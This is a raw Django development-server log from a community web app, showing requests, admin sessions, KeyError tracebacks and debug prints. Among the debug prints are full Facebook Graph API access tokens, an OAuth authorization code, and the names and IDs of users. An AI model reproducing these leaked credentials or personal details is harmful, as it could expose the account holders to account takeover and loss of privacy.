/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
Performing system checks...

System check identified no issues (0 silenced).
December 16, 2018 - 08:07:08
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[16/Dec/2018 08:09:51] "GET / HTTP/1.1" 301 0
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[16/Dec/2018 08:11:08] "GET / HTTP/1.1" 200 13160
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[16/Dec/2018 08:25:46] "GET / HTTP/1.0" 400 62311
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[16/Dec/2018 08:30:41] "GET / HTTP/1.0" 400 62311
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[16/Dec/2018 08:35:46] "GET / HTTP/1.0" 400 62313
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[16/Dec/2018 08:52:01] "GET / HTTP/1.1" 400 62299
[16/Dec/2018 08:55:57] "GET / HTTP/1.1" 301 0
[16/Dec/2018 09:04:37] "GET / HTTP/1.1" 301 0
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[16/Dec/2018 09:17:02] "GET / HTTP/1.0" 400 62313
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[16/Dec/2018 09:24:56] "GET / HTTP/1.0" 400 62614
[16/Dec/2018 09:54:06] "GET / HTTP/1.1" 301 0
[16/Dec/2018 09:55:08] "GET / HTTP/1.1" 301 0
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[16/Dec/2018 10:10:00] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 10:10:04] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 10:15:08] "GET /community/3 HTTP/1.1" 301 0
[16/Dec/2018 10:15:08] "GET /community/3/ HTTP/1.1" 200 11384
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[16/Dec/2018 10:15:10] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 301 0
[16/Dec/2018 10:15:10] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 301 0
Not Found: /community/3/logo.jpeg
[16/Dec/2018 10:15:11] "GET /community/3/logo.jpeg HTTP/1.1" 404 5995
[16/Dec/2018 10:15:17] "GET /community/4 HTTP/1.1" 301 0
[16/Dec/2018 10:15:18] "GET /community/4/ HTTP/1.1" 200 11576
[16/Dec/2018 10:15:26] "GET /community/4/members_list HTTP/1.1" 200 7956
[16/Dec/2018 10:17:00] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 10:17:03] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 10:17:07] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 10:17:20] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 10:17:20] "GET /media/media/logo.png HTTP/1.1" 200 11255
[16/Dec/2018 10:17:21] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[16/Dec/2018 10:17:22] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Not Found: /logo.jpeg
[16/Dec/2018 10:17:23] "GET /logo.jpeg HTTP/1.1" 404 5959
[16/Dec/2018 10:17:29] "GET / HTTP/1.1" 301 0
[16/Dec/2018 10:17:30] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 10:17:45] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 10:18:00] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
[16/Dec/2018 10:18:48] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 10:21:33] "GET /community/4/ HTTP/1.1" 301 0
----------------------------------------
Exception happened during processing of request from ('106.199.41.107', 23800)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 313, in _handle_request_noblock
    self.process_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 344, in process_request
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 139, in handle
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.7/socket.py", line 589, in readinto
    return self._sock.recv_into(b)
  File "/usr/lib64/python3.7/ssl.py", line 1049, in recv_into
    return self.read(nbytes, buffer)
  File "/usr/lib64/python3.7/ssl.py", line 908, in read
    return self._sslobj.read(len, buffer)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
----------------------------------------
Exception happened during processing of request from ('106.198.172.227', 24890)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 313, in _handle_request_noblock
    self.process_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 344, in process_request
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 139, in handle
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib64/python3.7/socket.py", line 589, in readinto
    return self._sock.recv_into(b)
  File "/usr/lib64/python3.7/ssl.py", line 1051, in recv_into
    return super().recv_into(buffer, nbytes, flags)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[16/Dec/2018 10:21:54] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 10:22:25] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 10:22:34] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 10:22:50] "GET /?data=Alumni&_=1544955752944 HTTP/1.1" 200 516
[16/Dec/2018 10:22:58] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 10:26:57] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 10:35:14] "GET /community/4/ HTTP/1.1" 200 11576
[16/Dec/2018 10:35:18] "GET /community/4/members_list HTTP/1.1" 200 7956
[16/Dec/2018 10:35:24] "GET /admin/ HTTP/1.1" 302 0
[16/Dec/2018 10:35:25] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1819
[16/Dec/2018 10:35:26] "GET /admin/ HTTP/1.1" 302 0
[16/Dec/2018 10:35:27] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1819
[16/Dec/2018 10:35:35] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
[16/Dec/2018 10:35:35] "GET /admin/ HTTP/1.1" 200 12402
[16/Dec/2018 10:35:43] "GET /admin/togther/userinfo/ HTTP/1.1" 200 5049
[16/Dec/2018 10:35:43] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[16/Dec/2018 10:35:46] "GET /admin/togther/userinfo/2/change/ HTTP/1.1" 200 10902
[16/Dec/2018 10:35:47] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[16/Dec/2018 10:35:53] "GET /admin/togther/userinfo/ HTTP/1.1" 200 5049
[16/Dec/2018 10:35:54] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[16/Dec/2018 10:35:56] "GET /admin/togther/userinfo/5/change/ HTTP/1.1" 200 10808
[16/Dec/2018 10:35:57] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[16/Dec/2018 10:36:06] "GET /admin/togther/ HTTP/1.1" 200 6500
[16/Dec/2018 10:36:08] "GET /admin/togther/community/ HTTP/1.1" 200 4628
[16/Dec/2018 10:36:08] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[16/Dec/2018 10:36:10] "GET /admin/togther/community/4/change/ HTTP/1.1" 200 7756
[16/Dec/2018 10:36:10] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[16/Dec/2018 10:36:15] "POST /admin/togther/community/4/change/ HTTP/1.1" 302 0
[16/Dec/2018 10:36:16] "GET /admin/togther/community/ HTTP/1.1" 200 4845
[16/Dec/2018 10:36:17] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[16/Dec/2018 10:36:23] "GET /admin/ HTTP/1.1" 200 12469
[16/Dec/2018 10:36:25] "GET /admin/logout/ HTTP/1.1" 200 1207
[16/Dec/2018 11:11:13] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 11:14:54] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_sOvU3Fz.jpg HTTP/1.1" 200 102923
[16/Dec/2018 11:14:55] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_DvPt80B.jpg HTTP/1.1" 200 102923
[16/Dec/2018 11:15:02] "GET /media/media/Screen_Shot_2018-12-03_at_3.56.49_PM.png HTTP/1.1" 200 1089536
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[16/Dec/2018 11:15:54] "GET / HTTP/1.1" 400 62281
[16/Dec/2018 11:17:08] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_sOvU3Fz.jpg HTTP/1.1" 200 102923
[16/Dec/2018 11:17:10] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_DvPt80B.jpg HTTP/1.1" 200 102923
[16/Dec/2018 11:17:19] "GET /media/media/Screen_Shot_2018-12-03_at_3.56.49_PM.png HTTP/1.1" 200 3624914
[16/Dec/2018 11:17:20] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_eaOXxUw.jpg HTTP/1.1" 200 102923
[16/Dec/2018 11:17:23] "GET /media/media/ACDC-Wallpaper-For-Desktop.jpg HTTP/1.1" 200 330672
[16/Dec/2018 11:17:24] "GET /media/media/jimmy-page-led-zeppelin-wallpaper.jpg HTTP/1.1" 200 102923
[16/Dec/2018 11:17:24] "GET /media/media/23283091_511838242502259_654899688_n.png HTTP/1.1" 200 18723
[16/Dec/2018 11:17:25] "GET /media/media/40af0d468633a4ee2f2344e6021f056b.jpg HTTP/1.1" 200 47540
[16/Dec/2018 11:17:35] "GET /media/media/abstract-access-close-up-1089438_fJciEGK.jpg HTTP/1.1" 200 5118188
[16/Dec/2018 11:17:46] "GET /media/media/abstract-access-close-up-1089438.jpg HTTP/1.1" 200 5118188
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[16/Dec/2018 11:17:46] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2055
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[16/Dec/2018 11:17:47] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1911
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 48, in dashboard
    info.email = data['email']
KeyError: 'email'
[16/Dec/2018 11:18:08] "GET / HTTP/1.1" 500 68527
Not Found: /favicon.ico
[16/Dec/2018 11:18:10] "GET /favicon.ico HTTP/1.1" 404 5965
[16/Dec/2018 11:18:21] "GET /logout HTTP/1.1" 302 0
[16/Dec/2018 11:18:21] "GET /login/ HTTP/1.1" 200 2762
Not Found: /login/logo.jpeg
[16/Dec/2018 11:18:22] "GET /login/logo.jpeg HTTP/1.1" 404 5977
[16/Dec/2018 11:18:23] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[16/Dec/2018 11:18:26] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 11:18:27] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[16/Dec/2018 11:18:28] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Not Found: /logo.jpeg
[16/Dec/2018 11:18:29] "GET /logo.jpeg HTTP/1.1" 404 5959
[16/Dec/2018 11:18:44] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 11:18:51] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 11:18:51] "GET /login/ HTTP/1.1" 200 2762
[16/Dec/2018 11:18:53] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 11:19:00] "GET /oauth/login/facebook/ HTTP/1.1" 302 0
[16/Dec/2018 11:19:02] "GET /oauth/complete/facebook/?granted_scopes=public_profile&denied_scopes&code=AQAAwHuzp-0Ism27FzZ_YnfT8dpgjY0JJn0Q1M2zRkaKDETN2cEIvDKRlMeWZa74zMOuFAF66PEfK_NLK7UxLMbwzzJ-KAwA4UXi0tu28FyXGsszLwqpLK2VYj6dSjUq5C2YCYnsMyYhCBg6w8g1Em7zpUJQVcs4wZa148xC1VYWkbQc6T2eRSIIadX8499qkDRL78b35t9X5tL7lsNAHGfqXp1pDfY8oz9WM8SJLPdzbxjmzqo0fjNspVTf1yYAAwRz8LUYLwsKRYLAnbo7KuAZg05lN8TwjDaVAxBvL-SCFS2AyCP5wFTqg41ApTMxWXKd6C9IdgvgIbcVvi5UkzqScWPlwr4jxX5ylPryF55UyQ&state=wynN3DEDvHUKniXxgjIKuBDcLoduMzTL HTTP/1.1" 302 0
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 48, in dashboard
    info.email = data['email']
KeyError: 'email'
[16/Dec/2018 11:19:03] "GET / HTTP/1.1" 500 68864
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 48, in dashboard
    info.email = data['email']
KeyError: 'email'
[16/Dec/2018 11:19:12] "GET / HTTP/1.1" 500 69000
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 48, in dashboard
    info.email = data['email']
KeyError: 'email'
[16/Dec/2018 11:20:08] "GET / HTTP/1.1" 500 68817
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 48, in dashboard
    info.email = data['email']
KeyError: 'email'
[16/Dec/2018 11:20:12] "GET / HTTP/1.1" 500 68532
[16/Dec/2018 11:20:33] "GET /logout HTTP/1.1" 302 0
[16/Dec/2018 11:20:34] "GET /login/ HTTP/1.1" 200 2762
[16/Dec/2018 11:20:40] "GET / HTTP/1.1" 200 13160
Not Found: /css/bootstrap.css
[16/Dec/2018 11:20:45] "GET /css/bootstrap.css HTTP/1.1" 404 5983
Not Found: /PcLpZ/QdQKi/css/linearicons.css
[16/Dec/2018 11:20:46] "GET /PcLpZ/QdQKi/css/linearicons.css HTTP/1.1" 404 6025
Not Found: /img/2.png
[16/Dec/2018 11:20:46] "GET /img/2.png HTTP/1.1" 404 5959
Not Found: /TKjcZ/aaNTb/img/1.png
[16/Dec/2018 11:20:46] "GET /TKjcZ/aaNTb/img/1.png HTTP/1.1" 404 5995
Not Found: /css/hexagons.min.css
[16/Dec/2018 11:20:48] "GET /css/hexagons.min.css HTTP/1.1" 404 5992
Not Found: /js/vendor/bootstrap.min.js
[16/Dec/2018 11:20:48] "GET /js/vendor/bootstrap.min.js HTTP/1.1" 404 6010
Not Found: /js/vendor/jquery-2.2.4.min.js
[16/Dec/2018 11:20:49] "GET /js/vendor/jquery-2.2.4.min.js HTTP/1.1" 404 6019
Not Found: /js/vendor/bootstrap.min.js
[16/Dec/2018 11:20:50] "GET /js/vendor/bootstrap.min.js HTTP/1.1" 404 6010
Not Found: /cover.png
[16/Dec/2018 11:20:50] "GET /cover.png HTTP/1.1" 404 5959
Not Found: /js/jquery.ajaxchimp.min.js
[16/Dec/2018 11:20:50] "GET /js/jquery.ajaxchimp.min.js HTTP/1.1" 404 6010
Not Found: /js/jquery.magnific-popup.min.js
[16/Dec/2018 11:20:50] "GET /js/jquery.magnific-popup.min.js HTTP/1.1" 404 6025
Not Found: /js/jquery.sticky.js
[16/Dec/2018 11:20:51] "GET /js/jquery.sticky.js HTTP/1.1" 404 5989
Not Found: /js/owl.carousel.min.js
[16/Dec/2018 11:20:51] "GET /js/owl.carousel.min.js HTTP/1.1" 404 5998
Not Found: /js/parallax.min.js
[16/Dec/2018 11:20:51] "GET /js/parallax.min.js HTTP/1.1" 404 5986
Not Found: /js/hexagons.min.js
[16/Dec/2018 11:20:52] "GET /js/hexagons.min.js HTTP/1.1" 404 5986
Not Found: /js/owl.carousel.min.js
[16/Dec/2018 11:20:52] "GET /js/owl.carousel.min.js HTTP/1.1" 404 5998
Not Found: /js/main.js
[16/Dec/2018 11:20:52] "GET /js/main.js HTTP/1.1" 404 5962
Not Found: /js/jquery.sticky.js
[16/Dec/2018 11:20:53] "GET /js/jquery.sticky.js HTTP/1.1" 404 5989
Not Found: /js/waypoints.min.js
[16/Dec/2018 11:20:53] "GET /js/waypoints.min.js HTTP/1.1" 404 5989
Not Found: /js/hexagons.min.js
[16/Dec/2018 11:20:53] "GET /js/hexagons.min.js HTTP/1.1" 404 5986
Not Found: /js/waypoints.min.js
[16/Dec/2018 11:20:54] "GET /js/waypoints.min.js HTTP/1.1" 404 5989
Not Found: /js/main.js
[16/Dec/2018 11:20:54] "GET /js/main.js HTTP/1.1" 404 5962
Not Found: /img/3.png
[16/Dec/2018 11:20:55] "GET /img/3.png HTTP/1.1" 404 5959
[16/Dec/2018 11:21:04] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 11:21:12] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 11:21:22] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 11:21:41] "GET /admin/ HTTP/1.1" 302 0
[16/Dec/2018 11:21:42] "GET /admin/ HTTP/1.1" 302 0
[16/Dec/2018 11:21:43] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1819
[16/Dec/2018 11:21:45] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1819
[16/Dec/2018 11:21:54] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
[16/Dec/2018 11:21:54] "GET /admin/ HTTP/1.1" 200 12469
[16/Dec/2018 11:21:57] "GET /admin/social_django/usersocialauth/ HTTP/1.1" 200 7195
[16/Dec/2018 11:21:58] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[16/Dec/2018 11:22:02] "GET /admin/social_django/usersocialauth/7/change/ HTTP/1.1" 200 7019
[16/Dec/2018 11:22:03] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
[16/Dec/2018 11:22:15] "GET /admin/social_django/usersocialauth/ HTTP/1.1" 200 7195
[16/Dec/2018 11:22:32] "GET / HTTP/1.1" 200 13160
[16/Dec/2018 11:22:45] "GET /admin/social_django/usersocialauth/7/change/ HTTP/1.1" 200 7019
[16/Dec/2018 11:22:45] "GET /admin/jsi18n/ HTTP/1.1" 200 3185
Performing system checks...

System check identified no issues (0 silenced).
December 16, 2018 - 10:08:23
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
Validating models...

System check identified no issues (0 silenced).
December 16, 2018 - 10:09:58
Django version 2.1, using settings 'project.settings'
Starting development server at https://0.0.0.0:443/
Using SSL certificate: letsencryptCert1.pem
Using SSL key: letsencryptprivkey1.pem
Quit the server with CONTROL-C.
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: test_community_1>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Nipun Goyal>]
admin <QuerySet [<Admins: IIT Delhi Entrepreneurs in Gurgaon>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{'data': 'Alumni', '_': '1544955752944'}
<QuerySet [<Category: test_community_1>, <Category: IIT Delhi Entrepreneurs in Gurgaon>]>
comm : [{'id': 3, 'name': 'test_community_1', 'about': 'about', 'image_url': '/media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg', 'location': 'Roorkee, Uttrakhand, India', 'members_count': 3}, {'id': 4, 'name': 'IIT Delhi Entrepreneurs in Gurgaon', 'about': 'This is an exclusive group for entrepreneurs who are IIT Delhi Alumni and are based out of Gurgaon.', 'image_url': '/media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg', 'location': 'Gurgaon', 'members_count': 5}]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: IIT Delhi Entrepreneurs in Gurgaon>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
10213635886440448
https://graph.facebook.com/v2.9/10213635886440448?fields=name,email,gender,location,picture,link&access_token=EAADvEwDa2W8BAGaiuQF6rIC1UTEb48UUXINdUcK1mwcF8wZAms8tlZBrW2SjkMkcNjBKZCoAlJxnl24F3Mw1pQHVGb85LrtZAOIrsiTs2gVInSBKdoAV5tTUCAuTYMis5UoF2MnIbGM8Slpz3ZB2PL3lC0qA2VTfU580l37ntPAZDZD
{'name': 'Parul Solanki Sharma', 'picture': {'data': {'height': 50, 'is_silhouette': False, 'url': 'https://platform-lookaside.fbsbx.com/platform/profilepic/?asid=10213635886440448&height=50&width=50&ext=1547551087&hash=AeRrCGtHllLYjX7J', 'width': 50}}, 'id': '10213635886440448'}
here
None
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
here
None
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
10213635886440448
https://graph.facebook.com/v2.9/10213635886440448?fields=name,email,gender,location,picture,link&access_token=EAADvEwDa2W8BADbfqJEx8ZB6aW4BOzMSqKIzYurb7wI94WNEh0nkNDbP7O7Pj7NPMiWjWuH07YJlSpC4l3kZC3vyxwZAXKsuYvI7ZBZBjrMAP2JIhsh9tLv610EChmU3UUsuS41su48jZAZCLAlAyCZAZAuJywffJZCz6PZB06XSduAiQZDZD
{'name': 'Parul Solanki Sharma', 'picture': {'data': {'height': 50, 'is_silhouette': False, 'url': 'https://platform-lookaside.fbsbx.com/platform/profilepic/?asid=10213635886440448&height=50&width=50&ext=1547551143&hash=AeTPBaefSxsAXHl3', 'width': 50}}, 'id': '10213635886440448'}
10213635886440448
https://graph.facebook.com/v2.9/10213635886440448?fields=name,email,gender,location,picture,link&access_token=EAADvEwDa2W8BADbfqJEx8ZB6aW4BOzMSqKIzYurb7wI94WNEh0nkNDbP7O7Pj7NPMiWjWuH07YJlSpC4l3kZC3vyxwZAXKsuYvI7ZBZBjrMAP2JIhsh9tLv610EChmU3UUsuS41su48jZAZCLAlAyCZAZAuJywffJZCz6PZB06XSduAiQZDZD
{'name': 'Parul Solanki Sharma', 'picture': {'data': {'height': 50, 'is_silhouette': False, 'url': 'https://platform-lookaside.fbsbx.com/platform/profilepic/?asid=10213635886440448&height=50&width=50&ext=1547551151&hash=AeQBwoepsQ6JN7kn', 'width': 50}}, 'id': '10213635886440448'}
10213635886440448
